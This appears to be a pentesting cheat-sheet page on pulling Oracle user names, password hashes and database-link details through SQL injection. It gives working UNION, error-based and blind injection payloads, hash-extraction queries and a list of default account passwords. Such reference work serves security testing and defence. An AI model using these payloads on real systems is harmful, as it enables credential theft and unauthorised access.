---
title: Database Credentials
description: How to extract Oracle database user credentials through SQL injection
category: Information Gathering
order: 4
tags: ["credentials", "users", "passwords"]
lastUpdated: 2026-10-08
---

Database accounts and their password hashes are a common target after an injection point is found: cracked or reused credentials allow direct logins, privilege escalation and lateral movement. Oracle exposes account names to every user, but password hashes only to highly privileged sessions.

## System Tables with User Information

| Table/View       | Description                                  | Access Required                                                                    |
| ---------------- | -------------------------------------------- | ---------------------------------------------------------------------------------- |
| `ALL_USERS`      | Names, IDs and creation dates of all users   | Any user                                                                           |
| `USER_USERS`     | Current user, including `ACCOUNT_STATUS`     | Any user                                                                           |
| `DBA_USERS`      | Account status, profile, authentication type | `SELECT_CATALOG_ROLE`, `SELECT ANY DICTIONARY` or DBA                              |
| `SYS.USER$`      | Raw user table with password hashes          | SYSDBA or an explicit grant on `SYS.USER$` (not `SELECT ANY DICTIONARY` since 12c) |
| `V$SESSION`      | Connected sessions                           | `SELECT_CATALOG_ROLE` or `SELECT ANY DICTIONARY`                                   |
| `V$PWFILE_USERS` | Users with SYSDBA, SYSOPER and similar       | `SELECT_CATALOG_ROLE` or `SELECT ANY DICTIONARY`                                   |

`ALL_USERS` has no `ACCOUNT_STATUS` column: account status is only in `USER_USERS` (current user) and `DBA_USERS`.

## Current User Context

```sql
-- Current username
SELECT USER FROM dual;

-- Session details, available to any user
SELECT SYS_CONTEXT('USERENV','SESSION_USER'), SYS_CONTEXT('USERENV','OS_USER'),
       SYS_CONTEXT('USERENV','HOST'), SYS_CONTEXT('USERENV','IP_ADDRESS') FROM dual;

-- The same from V$SESSION (requires SELECT_CATALOG_ROLE)
SELECT username, osuser, machine, program FROM v$session WHERE audsid = USERENV('SESSIONID');

-- Current session privileges
SELECT * FROM session_privs;
```

## Listing Database Users

### Basic User Enumeration (Low Privileges)

```sql
-- List all database users
SELECT username, created FROM all_users ORDER BY created DESC;

-- Users created by Oracle (ORACLE_MAINTAINED = 'Y', 12.1.0.2+) versus application users
SELECT username FROM all_users WHERE oracle_maintained = 'N';

-- Status of the current account
SELECT username, account_status FROM user_users;
```

### Detailed User Information (DBA Privileges)

```sql
-- Comprehensive user information (LAST_LOGIN is 12.1.0.2+)
SELECT username, account_status, profile, authentication_type,
       created, last_login, expiry_date, default_tablespace
FROM dba_users ORDER BY created DESC;

-- Default accounts that are open
SELECT username, account_status FROM dba_users
WHERE username IN ('SYS', 'SYSTEM', 'DBSNMP', 'MDSYS', 'OUTLN', 'SCOTT')
AND account_status = 'OPEN';

-- Users granted the DBA role
SELECT grantee FROM dba_role_privs WHERE granted_role = 'DBA';
```

## Password Hashes

Password hashes are stored in `SYS.USER$` (columns `NAME`, `PASSWORD`, `SPARE4`). Since 12c this table is excluded from `SELECT ANY DICTIONARY`, so even a DBA account cannot read it without SYSDBA or an explicit grant (`ORA-41900: missing READ privilege` on 23ai).

```sql
-- Oracle 10g and earlier: DES-based hash in PASSWORD
SELECT name, password FROM sys.user$ WHERE password IS NOT NULL;

-- Oracle 11g and later: S: (SHA-1) and T: (12.1.0.2+, PBKDF2 SHA-512) verifiers in SPARE4
SELECT name, spare4 FROM sys.user$ WHERE spare4 IS NOT NULL;

-- Which verifiers each account has (DBA_USERS, 11g+)
SELECT username, password_versions FROM dba_users;
```

Since 11g `DBA_USERS.PASSWORD` no longer shows the hash (it is empty, or `EXTERNAL`/`GLOBAL` for such accounts), and `SYS.USER$.PASSWORD` is empty unless the 10g verifier is still generated. Inside a pluggable database, common users such as `SYS` and `SYSTEM` still have their verifiers in `SYS.USER$` (checked on 21c and 23ai).

`DBMS_METADATA.GET_DDL` returns the hash as part of the `CREATE USER` statement. It needs `SELECT_CATALOG_ROLE` for users other than the current one, but not a grant on `SYS.USER$`:

```sql
SELECT DBMS_METADATA.GET_DDL('USER','SYSTEM') FROM dual;
-- CREATE USER "SYSTEM" IDENTIFIED BY VALUES 'S:...;T:...' ...
```

## SQL Injection Examples

These examples assume a string injection point (`'`) and, for UNION, a host query with two columns.

### UNION Attacks for User Enumeration

```sql
-- Basic user listing
' UNION SELECT username,NULL FROM all_users--

-- More detail
' UNION SELECT username||'~'||created,NULL FROM all_users--

-- Password hashes (needs access to SYS.USER$)
' UNION SELECT name,spare4 FROM sys.user$ WHERE spare4 IS NOT NULL--

-- Password hashes through DBMS_METADATA (needs SELECT_CATALOG_ROLE)
' UNION SELECT TO_CHAR(DBMS_METADATA.GET_DDL('USER','SYSTEM')),NULL FROM dual--
```

### Error-Based Extraction

`CTXSYS.DRITHSX.SN` requires Oracle Text and puts the subquery result in the error message (`DRG-11701: thesaurus <value> does not exist`):

```sql
-- First user
' OR CTXSYS.DRITHSX.SN(1,(SELECT username FROM all_users WHERE ROWNUM=1))=1--

-- Password hash, if SYS.USER$ is readable
' OR CTXSYS.DRITHSX.SN(1,(SELECT spare4 FROM sys.user$ WHERE name='SYSTEM'))=1--
```

### Blind Extraction Techniques

```sql
-- Boolean-based blind: first letter of the first user is 'S' (83)?
admin' AND (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83--

-- Time-based blind (EXECUTE on DBMS_PIPE: often not granted to PUBLIC, check ALL_TAB_PRIVS)
admin' AND (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83
     THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
```

See [Timing](/oracle/timing) for delays that need no privileges.

## Default/Common Oracle User Accounts

Up to 11g, many installations kept the default passwords below. The installer asks for `SYS` and `SYSTEM` passwords since 10g, but a manual `CREATE DATABASE` without them still assigned `CHANGE_ON_INSTALL` and `MANAGER` on 11g. Since 19c most Oracle-maintained accounts are schema-only accounts (`NO AUTHENTICATION`, 18c+) with no password at all (`AUTHENTICATION_TYPE = 'NONE'`); sample schemas such as `SCOTT` still get their default passwords. `DBA_USERS_WITH_DEFPWD` (11g+) lists accounts that still use a default password.

| Username  | Default Password                        | Description                      |
| --------- | --------------------------------------- | -------------------------------- |
| SYS       | CHANGE_ON_INSTALL, manager, oracle, sys | Super user account               |
| SYSTEM    | MANAGER, oracle, system                 | System administrator account     |
| SCOTT     | TIGER                                   | Demo account                     |
| DBSNMP    | DBSNMP                                  | Monitoring account               |
| ANONYMOUS | ANONYMOUS                               | Anonymous web access             |
| CTXSYS    | CTXSYS                                  | Oracle Text account              |
| MDSYS     | MDSYS                                   | Spatial data account             |
| OUTLN     | OUTLN                                   | Stored outlines for optimization |

## Oracle Database Link Credentials

Database links store the remote username and password. The views show the username but not the password:

```sql
-- Links visible to the current user
SELECT owner, db_link, username, host, created FROM all_db_links;

-- All links (DBA)
SELECT owner, db_link, username, host, created FROM dba_db_links;
```

The password is stored in `SYS.LINK$`: in clear text in `PASSWORD` before 10gR2, encrypted in `PASSWORDX` since. Like `SYS.USER$`, `SYS.LINK$` is not readable through `SELECT ANY DICTIONARY` (since 10g for `LINK$`, 12c for `USER$`).

## Password Policies and Profiles

```sql
-- Password limits of the current user's profile (any user)
SELECT resource_name, limit FROM user_password_limits;

-- Password limits of every profile (DBA)
SELECT profile, resource_name, limit FROM dba_profiles WHERE resource_type = 'PASSWORD';

-- Profile assigned to each user (DBA)
SELECT username, profile FROM dba_users;
```

`FAILED_LOGIN_ATTEMPTS` shows how many wrong passwords lock an account, which matters before trying passwords against the listener.

## Advanced Credential Hunting

### Finding Hard-coded Credentials in PL/SQL Code

```sql
-- Search for keywords in stored code visible to the current user
SELECT owner, name, text FROM all_source
WHERE UPPER(text) LIKE '%PASSWORD%' OR UPPER(text) LIKE '%CREDENTIALS%';

-- Code that encrypts or decrypts values
SELECT owner, name, text FROM all_source
WHERE UPPER(text) LIKE '%DBMS_CRYPTO%' OR UPPER(text) LIKE '%DBMS_OBFUSCATION_TOOLKIT%';
```

### Exploring External Authentication Information

```sql
-- Externally authenticated users (OS authentication, DBA)
SELECT username FROM dba_users WHERE authentication_type = 'EXTERNAL';

-- Globally authenticated users (directory services, DBA)
SELECT username FROM dba_users WHERE authentication_type = 'GLOBAL';
```

## Real-world Attack Patterns

```sql
-- Users with their hashes in one column (needs access to SYS.USER$)
' UNION SELECT username,(SELECT spare4 FROM sys.user$ WHERE name=username) FROM all_users--

-- Name and hash in one column, for a host query with one text column
' UNION SELECT name||':'||spare4 FROM sys.user$ WHERE spare4 IS NOT NULL--
```

Oracle has no `INTO OUTFILE`: writing results to a file needs `UTL_FILE` from PL/SQL, which a SQL injection cannot run directly.
